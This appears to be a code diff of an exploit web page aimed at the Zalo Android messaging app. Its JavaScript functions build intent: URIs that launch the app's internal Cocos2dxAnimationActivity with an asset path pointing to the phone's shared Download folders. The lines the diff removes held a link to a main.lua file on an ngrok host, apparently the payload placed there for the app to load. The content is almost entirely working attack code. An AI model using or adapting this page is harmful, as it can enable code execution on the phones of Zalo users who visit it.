@@ -1,18 +1,29 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <h1>zalo.html</h1>
-        <a style='font-size: 2.0em;' href="https://36e9-121-190-139-95.ngrok-free.app/main.lua">Download</a>
+        <a style='font-size: 2.0em;' href='javascript: go_1()'>go 1</a>
         <br/><br/>
-        <a style='font-size: 2.0em;' href='javascript: go()'>Cocos2dxAnimationActivity</a>
+        <a style='font-size: 2.0em;' href='javascript: go_2()'>go 2</a>
     </body>
 
     <script>
-        function go() {
+        function go_1() {
             let intent = '';
             intent += 'intent:#Intent;';
             intent += 'component=com.zing.zalo/com.zing.zalo.ui.Cocos2dxAnimationActivity;';
             intent += 'S.extra_asset_path=/storage/emulated/0/Download/Zalo/;';
+            intent += 'S.extra_metadata_name=;';
+            intent += 'i.extra_effect_type=5;';
+            intent += 'S.extra_play_params=x;';
+            intent += 'B.extra_keyboard_showing=false;';
+            intent += 'end;';
+            window.location.href = intent;
+        }
+        function go_2() {
+            let intent = '';
+            intent += 'intent:#Intent;';
+            intent += 'component=com.zing.zalo/com.zing.zalo.ui.Cocos2dxAnimationActivity;';
+            intent += 'S.extra_asset_path=/storage/emulated/0/Download/;';
             intent += 'S.extra_metadata_name=;';
             intent += 'i.extra_effect_type=5;';
             intent += 'S.extra_play_params=x;';
